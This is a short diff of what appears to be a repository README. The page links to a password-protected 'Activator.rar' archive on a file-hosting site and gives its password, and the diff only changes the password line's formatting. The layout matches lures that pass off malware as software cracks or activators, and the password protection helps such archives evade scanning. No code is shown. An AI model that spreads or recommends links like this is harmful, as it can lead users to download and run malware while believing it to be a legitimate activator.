@@ -4,7 +4,7 @@
 
 # 🗂[Ｌｏａｄ](https://www.mediafire.com/file/4p83gevhkce5o87/Activator.rar/file)
 
-# 🔓Ｐａｓｓ 111
+# 🔓Ｐａｓｓ: 111
 
 # 🔴Ｉｎｆｏ:
 
